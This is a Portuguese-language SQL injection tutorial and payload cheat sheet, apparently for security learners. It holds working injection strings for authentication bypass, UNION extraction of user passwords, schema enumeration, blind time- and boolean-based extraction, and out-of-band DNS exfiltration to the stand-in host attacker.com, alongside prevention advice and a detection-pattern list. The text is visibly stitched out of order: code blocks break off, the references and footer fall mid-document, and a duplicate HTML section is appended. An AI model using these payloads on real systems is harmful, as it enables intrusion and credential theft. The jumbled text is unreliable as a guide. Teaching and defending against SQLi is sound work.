# SQL Injection (SQLi)

## 📊 Metadados

| Propriedade | Valor |
|---|---|
| **CVSS Score** | 9.8 (Crítico) |
| **OWASP Top 10** | #3 - Injection |
| **CWE** | CWE-89 |
| **Status** | ⚠️ Ativo e crítico |
| **Impacto** | Confidencialidade, Integridade, Disponibilidade |

---

## 🔍 O que é SQL Injection (SQLi)?

SQL Injection é uma vulnerabilidade web que permite o atacante interferir nas consultas SQL que a aplicação executa no banco de dados. Essa interferência pode resultar em:

- **Extração de dados confidenciais** (senhas, números de cartão, PII)
- **Modificação/Deleção de dados** (perda de integridade)
- **Bypass de autenticação** (acesso como admin)
- **Remote Code Execution (RCE)** (em alguns casos)
- **Negação de Serviço (DoS)** (derrubar o banco de dados)

---

## 🎯 Tipos de SQL Injection

### 1. **Retrieving Hidden Data (Error-Based)**
Modificar a SQL para retornar resultados adicionais ou ocultos.

### 2. **Subverting Application Logic**
Interferir na lógica da aplicação (bypass de autenticação, autorização).

### 3. **UNION-Based SQLi**
Recuperar dados de diferentes tabelas do banco usando `UNION SELECT`.

### 4. **Blind SQL Injection**
- **Time-Based:** A aplicação não retorna erro, mas o tempo de resposta varia
- **Boolean-Based:** Infere dados através de respostas true/false

### 5. **Stacked Queries**
Executar múltiplas instruções SQL sequencialmente.

### 6. **Out-of-Band (OOB)**
Exfiltrar dados via DNS, HTTP callbacks, etc.

## 💥 Exemplos Práticos de Exploração

### 1. **Contornando Filtros com Comentários**

**Cenário:** Aplicação lista produtos por categoria

```
URL: https://insecure-website.com/products?category=Gifts
Query Original: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Payload - Remover restrição AND:**
```
Category: Gifts'--
Query Resultante: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
Resultado: Mostra todos produtos, incluindo não-lançados
```

**Payload - Condition-based:**
```
Category: Gifts' OR '1'='1
Query Resultante: SELECT * FROM products WHERE category = 'Gifts' OR '1'='1'
Resultado: Retorna TODOS os produtos do banco
```

**Variações por SGBD:**
```
MySQL:       # comentário
MSSQL/Oracle: -- comentário
PostgreSQL:  -- comentário
```

---

### 2. **Bypass de Autenticação**

**Cenário:** Login com username e password

```
Query Original: SELECT * FROM users WHERE username='wiener' AND password='bluecheese'
```

**Payload - Comment bypass:**
```
Username: administrator'--
Password: (qualquer coisa)
Query: SELECT * FROM users WHERE username='administrator'--' AND password=''
Resultado: Login como admin sem saber a senha
```

**Payload - OR condition:**
```
Username: admin
Password: ' OR '1'='1
Query: SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
Resultado: Bypass do password check
```

### 3. **UNION-Based Injection**

**Objetivo:** Extrair dados de outras tabelas

```sql
-- Query original
SELECT name, description FROM products WHERE category = 'Gifts'

-- Payload
Gifts' UNION SELECT username, password FROM users--

-- Query resultante
SELECT name, description FROM products WHERE category = 'Gifts'
### 4. **Enumerando o Banco de Dados**

**Descobrir informações da estrutura:**

```sql
-- MySQL
SELECT * FROM information_schema.tables WHERE table_schema=database()
SELECT * FROM information_schema.columns WHERE table_name='users'

-- MSSQL
SELECT * FROM sys.tables
SELECT * FROM sys.columns WHERE object_id=OBJECT_ID('users')

-- Oracle
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- PostgreSQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns
```

**Versão e sistema:**
```sql
-- MySQL
SELECT version()
SELECT @@version

-- MSSQL
SELECT @@version
SELECT SERVERPROPERTY('ProductVersion')

-- Oracle
SELECT * FROM v$version

-- PostgreSQL
SELECT version()
### 5. **Blind SQL Injection - Time-Based**

**Cenário:** Aplicação não mostra erros nem dados, mas responde lentamente

```sql
-- Teste básico (deve levar 10 segundos)
' WAITFOR DELAY '00:00:10'--  (MSSQL)
' OR SLEEP(10)--              (MySQL)
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--  (PostgreSQL)

-- Extração condicional
' OR IF(1=1, SLEEP(5), 0)--
## 🛡️ Contramedidas e Prevenção

### 1. **Prepared Statements (Parameterized Queries)**
```python
# ❌ Vulnerável
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# ✅ Seguro
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))
```

### 2. **Input Validation**
- Whitelist de valores aceitos
- Validação de tipos de dados
- Limitar comprimento da entrada
- Rejeitar caracteres especiais

### 3. **Principle of Least Privilege**
```sql
-- Aplicação deve usar account com permissões limitadas
-- ❌ Evitar
GRANT ALL PRIVILEGES ON *.* TO app_user;

-- ✅ Correto
GRANT SELECT, INSERT ON database.table TO app_user;
```

### 4. **WAF (Web Application Firewall)**
- Detectar padrões de SQLi
- Rate limiting
- Bloquear keywords suspeitas

### 5. **Logging e Monitoramento**
- Log de queries suspeitas
- Alertas de tentativas de injeção
- Auditoria de acessos

---

## 📌 Detecção em Tempo Real

### Padrões Suspeitos
- `' OR '1'='1`
- `UNION SELECT`
- `; DROP TABLE`
- `--`, `#`, `/**/` (comentários)
- `WAITFOR`, `SLEEP()` (time delays)

### Ferramentas de Teste
- **sqlmap:** Automação completa
- **Burp Suite:** Análise manual
- **SQLNinja:** Para MSSQL
- **NoSQLMap:** Para NoSQL injections

---

## 📚 Referências

| Fonte | Link |
|---|---|
| PortSwigger Academy | https://portswigger.net/web-security/sql-injection |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| HackTricks SQLi | https://book.hacktricks.xyz/pentesting-web/sql-injection |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection |
| CWE-89 | https://cwe.mitre.org/data/definitions/89.html |

---

**Última atualização:** Agosto 2026
' OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--
```

---

### 6. **Blind SQL Injection - Boolean-Based**

**Cenário:** Aplicação retorna True/False baseado em condição

```sql
-- Payloads que retornam True
' AND 1=1--
' AND '1'='1

-- Payloads que retornam False
' AND 1=2--
' AND '1'='2

-- Extração condicional
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='p'--
-- Se True, primeira letra é 'p'
```

---

### 7. **Out-of-Band (OOB) Data Exfiltration**

**Exfiltrar dados via DNS:**
```sql
-- Oracle
' || dbms_ldap.use_null_auth=( SELECT CASE WHEN (1=1) 
  THEN dbms_ldap.init(('attacker.com'||'.'),1) ELSE 0 END )--

-- MSSQL
'; DECLARE @x varchar(1024);
SET @x=(SELECT @@version);
EXEC master..xp_dirtree @x--

-- MySQL (via DNS)
' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\'+@@version)--
```
<h2>Retornando dados de outra tabela no banco de dados</h2>

No caso onde o resultado da consulta SQL é retornado na resposta da aplicação, o atacante pode aproveitar a vulnerabilidade de SQL Injection para retornar dados de uma outra tabela no banco de dados. Isso pode ser feito usando a clausula UNION, que deixa você executar um SELECT adicional na consulta e acrescenta no final da consulta original.

Por exemplo, se a aplicação executa a seguinte consulta contendo a entrada do usuario 'Gifts'.

        SELECT name, description FROM products WHERE category = 'Gifts'
        
Então o atacante pode enviar a entrada:

        ' UNION SELECT username, password FROM users--
        
Isso fará a aplicação retornar todos usernames e senhas, juntamente com os nomes e descrições dos produtos.

<h2>Examinando o banco de dados</h2>

Após a identificação de um SQL Injection, geralmente é útil obter algumas informações sobre o banco de dados. Essas informações podem abrir caminhos para uma maior exploração.

Você pode consultar por detalhes de versão do banco de dados. A maneira como isso é feito depende do tipo de banco de dados. Por exemplo, no Oracle você pode executar:

        SELECT * FROM v$version
        
Você também pode determinar tabelas existentes, e quais colunas ela contem. Por exemplo, na maioria dos bancos de dados você pode executar a seguinte consulta para listar as tabelas:

        SELECT * FROM information_schema.tables
        
<h2>Vulnerabilidades de Blind SQL injection</h2>

Muitas vezes o SQL Injection é do tipo blind. Isso significa que a aplicação não retorna nenhum resultado da query SQL ou detalhes de algum erro do banco de dados na resposta. Vulnerabilidades Blind ainda podem ser utilizadas para acessar informações não autorizadas, mas as técnicas envolvidas são geralmente mais complicadas e dificeis de ser executadas.

Dependendo da natureza da vulnerabilidade e do banco de dados envolvido, as seguintes técnicas podem ser usadas para explorar vulnerabilidades de SQL Injection Blind:

<li>Você pode mudar a logica da query para acionar uma diferença detectavel na resposta da aplicação dependendo da verdade de uma unica condição. Isso pode envolver uma injeção de uma nova condição em alguma lógica booleana ou o acionamento condicional de um erro, como uma divisão por zero.</li>
<li>Você pode acionar condicionalmente um delay no na consulta da query, permitindo assim verificar a veracidade de uma informação baseado no tempo de resposta da aplicação.</li>
<li>Você pode acionar uma interação <a href="https://notsosecure.com/out-band-exploitation-oob-cheatsheet">out-of-band</a>, usando técnicas OAST. Essa técnica é extremamente poderosa e funciona em situações onde outras técnicas não funcionam. Você pode exfiltrar dados via comunicação out-of-band, por exemplo pondo o dado dentro de uma consulta DNS para algum dominio em seu controle.</li>
